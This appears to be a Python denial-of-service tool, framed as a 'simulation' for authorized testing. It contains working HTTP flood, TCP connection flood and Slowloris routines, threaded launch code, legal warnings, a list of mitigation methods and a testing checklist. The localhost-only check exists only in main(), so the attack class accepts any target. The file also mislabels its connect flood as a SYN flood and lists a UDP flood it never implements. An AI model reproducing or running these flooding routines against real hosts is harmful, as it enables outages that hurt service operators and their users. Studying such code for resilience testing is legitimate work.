#!/usr/bin/env python3
"""
DDoS Attack Simulation - Project 33
Controlled DDoS testing for authorized security testing.

⚠️ CRITICAL LEGAL WARNING ⚠️
Only simulate DDoS on systems you own or have explicit written permission to test.
DDoS attacks are federal crimes in most countries.
"""

import socket
import threading
import time
import random
from typing import List

class DDoSSimulator:
    """Controlled DDoS testing tool."""
    
    def __init__(self, target_host: str, target_port: int = 80):
        self.target_host = target_host
        self.target_port = target_port
        self.running = False
        self.threads = []
    
    def http_flood(self, duration: int = 10, requests_per_thread: int = 100):
        """HTTP flood simulation."""
        end_time = time.time() + duration
        
        while time.time() < end_time and self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.target_host, self.target_port))
                
                # Send HTTP GET request
                request = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {self.target_host}\r\n"
                    f"User-Agent: Mozilla/5.0\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n"
                    f"X-Custom: {random.randint(1, 999999)}\r\n"
                    f"\r\n"
                )
                
                s.send(request.encode())
                s.close()
                
            except Exception as e:
                pass
    
    def tcp_flood(self, duration: int = 10):
        """TCP SYN flood simulation (simulated)."""
        end_time = time.time() + duration
        
        while time.time() < end_time and self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect((self.target_host, self.target_port))
                s.close()
            except:
                pass
    
    def slow_loris(self, duration: int = 10, connections: int = 100):
        """Slowloris - keep connections open."""
        sockets = []
        end_time = time.time() + duration
        
        # Create connections
        for _ in range(connections):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.target_host, self.target_port))
                s.send(f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n".encode())
                sockets.append(s)
            except:
                pass
        
        # Keep alive
        while time.time() < end_time and self.running and sockets:
            for s in sockets:
                try:
                    s.send(b"X-a: b\r\n")
                except:
                    sockets.remove(s)
            time.sleep(15)
        
        for s in sockets:
            s.close()
    
    def start_attack(self, method: str = "http", duration: int = 10, threads: int = 5):
        """Start attack simulation."""
        print(f"[*] Starting {method} attack simulation")
        print(f"[*] Target: {self.target_host}:{self.target_port}")
        print(f"[*] Duration: {duration}s, Threads: {threads}")
        print(f"[*] Press Ctrl+C to stop\n")
        
        self.running = True
        
        if method == "http":
            for _ in range(threads):
                t = threading.Thread(target=self.http_flood, args=(duration, 100))
                t.start()
                self.threads.append(t)
        
        elif method == "slowloris":
            self.slow_loris(duration, connections=50)
        
        # Wait for completion
        for t in self.threads:
            t.join()
        
        self.running = False
        print("\n[+] Attack simulation complete")
    
    def stop_attack(self):
        """Stop attack simulation."""
        self.running = False
        print("[*] Stopping attack...")

def main():
    print("""
╔════════════════════════════════════════════════════════════════╗
║     DDoS Attack Simulation - Project 33                      ║
║                                                                ║
║     ⚠️ CRITICAL LEGAL WARNING ⚠️                                ║
║                                                                ║
║     Only simulate on systems you own or have written           ║
║     permission to test. DDoS attacks are crimes.               ║
║                                                                ║
║     This is for:                                              ║
║     - Penetration testing with permission                      ║
║     - DDoS resilience training                                ║
║     - Understanding attack methods                             ║
╚════════════════════════════════════════════════════════════════╝

ATTACK TYPES:

| Type | Description | Impact |
|------|-------------|--------|
| HTTP Flood | GET/POST requests | Server overload |
| TCP SYN | Half-open connections | Connection exhaustion |
| Slowloris | Slow connections | Connection exhaustion |
| UDP Flood | UDP packets | Bandwidth saturation |

PROTECTION METHODS:

1. RATE LIMITING
   - Limit requests per IP
   - Connection limits
   - Geographic restrictions

2. CDN/WAF
   - Cloudflare, Akamai
   - Traffic filtering
   - Anycast distribution

3. BOT DETECTION
   - JavaScript challenges
   - CAPTCHA
   - Browser fingerprinting

4. DDoS MITIGATION SERVICES
   - AWS Shield
   - Google Cloud Armor
   - Azure DDoS Protection

AUTHORIZED TESTING CHECKLIST:

[ ] Written permission from system owner
[ ] Defined scope (IP addresses, duration)
[ ] Emergency contacts established
[ ] Rollback plan ready
[ ] Insurance/liability coverage
[ ] Legal review completed

DEMO (localhost only!):

python3 ddos_sim.py --target 127.0.0.1 --port 80 --method http --duration 5 --threads 2
    """)
    
    import sys
    import argparse
    
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', default='127.0.0.1')
    parser.add_argument('--port', type=int, default=80)
    parser.add_argument('--method', default='http')
    parser.add_argument('--duration', type=int, default=10)
    parser.add_argument('--threads', type=int, default=5)
    args = parser.parse_args()
    
    if args.target != '127.0.0.1':
        print("\n[!] WARNING: Only localhost testing allowed!")
        print("[!] Exiting for safety.")
        sys.exit(1)
    
    sim = DDoSSimulator(args.target, args.port)
    try:
        sim.start_attack(args.method, args.duration, args.threads)
    except KeyboardInterrupt:
        sim.stop_attack()

if __name__ == "__main__":
    main()
